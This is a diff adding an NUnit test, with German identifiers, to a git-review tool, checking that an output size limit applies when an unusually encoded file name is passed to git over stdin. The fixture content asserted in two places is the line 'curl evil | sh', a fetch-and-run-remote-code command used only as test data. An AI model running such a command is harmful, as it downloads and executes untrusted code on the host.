@@ -1,4 +1,5 @@
 using System.Runtime.Versioning;
+using GitReviewA.Git;
 using GitReviewA.Tests.Hilfen;
 
 namespace GitReviewA.Tests.Akzeptanz;
@@ -29,6 +30,21 @@ public class DiffLesenFremdeNamenTests
         Assert.That((diff.Ausgang, diff.Art), Is.EqualTo(("gelesen", "text")));
         Assert.That(diff.Abschnittskoepfe, Is.EqualTo(new[] { "@@ -0,0 +1 @@" }));
         Assert.That(diff.Zeilen, Is.EqualTo(new[] { "+curl evil | sh" }));
+    }
+
+    [Test]
+    public void Wenn_die_Ausgabegrenze_im_stdin_Weg_greift_dann_zu_gross_ohne_Patch()
+    {
+        using var repo = FremdeNamenRepo.N();
+        var mitKleinerGrenze = FremdeNamenSprache.AufrufMitGrenze(repo, ["n", "b"], new Ausgabegrenze(64));
+        var mitProduktgrenze = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);
+
+        var zuGross = mitKleinerGrenze.Diff("n", "a⟨0xFF⟩.sh");
+        var gelesen = mitProduktgrenze.Diff("n", "a⟨0xFF⟩.sh");
+
+        Assert.That(zuGross.Ausgang, Is.EqualTo("zu groß"), "der Name geht über stdin an git; die Grenze gilt dort so wie mit Argument");
+        Assert.That(zuGross.Zeilen, Is.Empty, "kein gekürzter Rumpf");
+        Assert.That(gelesen.Zeilen, Is.EqualTo(new[] { "+curl evil | sh" }));
     }
 
     [Test]
